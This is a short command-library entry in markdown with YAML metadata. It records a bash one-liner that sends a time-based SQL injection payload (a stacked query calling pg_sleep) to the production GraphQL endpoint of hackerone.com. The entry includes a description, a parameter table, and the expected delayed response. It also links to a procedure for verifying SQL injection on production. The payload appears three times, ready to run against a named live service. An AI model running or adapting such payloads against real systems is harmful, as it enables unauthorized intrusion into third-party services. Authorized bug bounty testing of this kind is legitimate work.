---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
tags:
  - sqli
  - timing
type: command
output: 'Response time ~1.631 seconds with {} JSON'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.285Z'
id: bf66fa68-b841-406c-bfa2-ba3c76cc4ac9
verified: false
validated: true
submitted: true
---
# time-curl-prod-1s

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

## Description

Times a 1-second pg_sleep injection on production to baseline SQLi delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Timing utility | Yes |
| `curl` | HTTP client | Yes |
| `embedded_submission_form_uuid` | 1s payload | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

## Expected Output

real 0m1.631s
{} JSON.

## Related

- [[Related Procedure: Verify-SQL-Injection-on-Production]]
